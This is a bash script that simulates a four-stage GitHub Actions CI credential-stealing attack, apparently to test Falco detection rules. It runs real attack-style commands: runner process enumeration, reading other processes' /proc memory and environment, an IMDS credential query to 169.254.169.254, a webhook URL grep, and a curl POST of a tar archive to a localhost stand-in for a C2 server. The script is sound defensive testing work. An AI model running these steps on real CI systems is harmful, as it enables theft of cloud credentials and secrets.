#!/usr/bin/env bash
# =============================================================================
# TeamPCP — Trivy/Checkmarx GitHub Actions Compromise
# Safe simulation of the 4-stage CI credential stealer
#
# SAFE: No real C2 contacted. tpcp.tar.gz exfiltration targets localhost:9999.
#       IMDS call uses --max-time 2 (will respond with Azure metadata on GitHub runners).
#
# Each stage maps to one or more Falco rules.
# =============================================================================

set -uo pipefail

BOLD='\033[1m'
RESET='\033[0m'
RED='\033[0;31m'
YELLOW='\033[0;33m'

echo -e "${BOLD}TeamPCP — Trivy/Checkmarx GitHub Actions Compromise${RESET}"
echo "Simulating the 4-stage CI credential stealer (March 2026)"
echo "Reference: teampcp-checkmarx-supply-chain.md"
echo ""

# =============================================================================
# Stage 1: CI Runner Process Enumeration
# TeamPCP located Runner.Worker PIDs before targeting their /proc/*/mem
# Expected rule: TeamPCP - CI Runner Process Enumeration (WARNING)
# =============================================================================
echo -e "${BOLD}=== Stage 1: CI Runner Process Enumeration ===${RESET}"
echo "Simulating: pgrep -f Runner.Worker / pgrep -f Runner.Listener"
echo ""

pgrep -f Runner.Worker  2>/dev/null || true
pgrep -f Runner.Listener 2>/dev/null || true
pidof Runner.Worker      2>/dev/null || true

echo -e "${YELLOW}Expected rule: TeamPCP - CI Runner Process Enumeration (WARNING)${RESET}"
echo ""
sleep 1

# =============================================================================
# Stage 2: /proc Memory Dump
# Reads runner process memory to extract in-memory secrets and tokens.
# Expected rules:
#   - Process Dumping Memory of Others (WARNING) — base rule
#   - Process Reading Environment Variables of Others (WARNING) — base rule
# =============================================================================
echo -e "${BOLD}=== Stage 2: /proc Memory Extraction ===${RESET}"
BASH_PID=$(pgrep -o bash 2>/dev/null | head -1 || true)
echo "Targeting PID: ${BASH_PID:-<none found>}"
echo ""

if [ -n "$BASH_PID" ] && [ "$BASH_PID" != "$$" ]; then
    echo "Simulating: dd if=/proc/$BASH_PID/mem ..."
    dd if=/proc/"$BASH_PID"/mem bs=1 count=1 skip=0 2>/dev/null || true

    echo "Simulating: cat /proc/$BASH_PID/environ ..."
    cat /proc/"$BASH_PID"/environ 2>/dev/null | tr '\0' '\n' | head -3 || true
else
    echo "No external bash PID found — triggering via subshell PID"
    SUBPID=$(bash -c 'echo $$' 2>/dev/null)
    dd if=/proc/"$SUBPID"/mem bs=1 count=1 skip=0 2>/dev/null || true
fi

echo -e "${YELLOW}Expected rules: Process Dumping Memory of Others (WARNING)${RESET}"
echo -e "${YELLOW}                Process Reading Environment Variables of Others (WARNING)${RESET}"
echo ""
sleep 1

# =============================================================================
# Stage 3: IMDS Credential Harvest
# Queries 169.254.169.254 for temporary AWS IAM credentials.
# On GitHub-hosted runners (Azure), IMDS responds with Azure metadata.
# Expected rule: TeamPCP - IMDS Credential Harvesting in CI (CRITICAL)
# =============================================================================
echo -e "${BOLD}=== Stage 3: IMDS Credential Harvest ===${RESET}"
echo "Simulating: curl http://169.254.169.254/latest/meta-data/iam/security-credentials/"
echo "Note: on GitHub-hosted runners this connects to Azure IMDS"
echo ""

curl -sf --max-time 2 \
    http://169.254.169.254/latest/meta-data/iam/security-credentials/ \
    2>/dev/null || true

echo -e "${RED}Expected rule: TeamPCP - IMDS Credential Harvesting in CI (CRITICAL)${RESET}"
echo ""
sleep 1

# =============================================================================
# Stage 4a: Webhook URL Harvesting
# Scans workspace for Slack/Discord webhook URLs.
# Expected rule: TeamPCP - Webhook URL Harvesting in CI (WARNING)
# =============================================================================
echo -e "${BOLD}=== Stage 4a: Webhook URL Harvesting ===${RESET}"
echo "Simulating: grep -r \"hooks.slack.com|discord.com/api/webhooks\" ."
echo ""

grep -r "hooks.slack.com\|discord.com/api/webhooks" . 2>/dev/null || true

echo -e "${YELLOW}Expected rule: TeamPCP - Webhook URL Harvesting in CI (WARNING)${RESET}"
echo ""
sleep 1

# =============================================================================
# Stage 4b: Encrypted Archive Exfiltration
# Bundles secrets and POSTs tpcp.tar.gz to C2.
# SAFE: target is localhost:9999 (unreachable, curl will fail).
# Expected rule: TeamPCP - Encrypted Archive Exfiltration via Curl (CRITICAL)
# =============================================================================
echo -e "${BOLD}=== Stage 4b: Encrypted Archive Exfiltration ===${RESET}"
echo "Simulating: curl --data-binary @tpcp.tar.gz -X POST <typosquat-domain>"
echo "SAFE: target is localhost:9999 (no real C2 contacted)"
echo ""

echo "PLACEHOLDER_AES256_RSA4096_ENCRYPTED_SECRETS" > /tmp/secrets_bundle.txt
tar czf /tmp/tpcp.tar.gz -C /tmp secrets_bundle.txt 2>/dev/null
rm -f /tmp/secrets_bundle.txt

curl -s -o /dev/null -w "%{http_code}" \
    -X POST http://127.0.0.1:9999/ \
    -H "Content-Type: application/octet-stream" \
    -H "X-Filename: tpcp.tar.gz" \
    --data-binary @/tmp/tpcp.tar.gz \
    2>/dev/null || true

rm -f /tmp/tpcp.tar.gz

echo -e "${RED}Expected rule: TeamPCP - Encrypted Archive Exfiltration via Curl (CRITICAL)${RESET}"
echo ""

# =============================================================================
echo -e "${BOLD}=== Simulation Complete ===${RESET}"
echo ""
echo "Rules expected to fire:"
echo "  WARNING   TeamPCP - CI Runner Process Enumeration"
echo "  WARNING   Process Dumping Memory of Others              (base rule)"
echo "  WARNING   Process Reading Environment Variables of Others (base rule)"
echo "  CRITICAL  TeamPCP - IMDS Credential Harvesting in CI"
echo "  WARNING   TeamPCP - Webhook URL Harvesting in CI"
echo "  CRITICAL  TeamPCP - Encrypted Archive Exfiltration via Curl"
